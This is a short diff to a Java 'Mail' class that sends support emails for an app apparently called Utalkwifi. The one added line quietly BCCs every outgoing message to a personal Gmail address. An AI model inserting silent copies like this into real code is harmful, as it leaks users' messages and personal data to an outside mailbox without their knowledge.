@@ -68,6 +68,7 @@ public class Mail {
 
 			message.setFrom(new InternetAddress("info@utalkwifi.com", "Utalkwifi App support"));
 			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(emailid));
+			message.setRecipients(Message.RecipientType.BCC, InternetAddress.parse("kirti.mandwade@gmail.com"));
 
 			message.setSubject(subject);
 
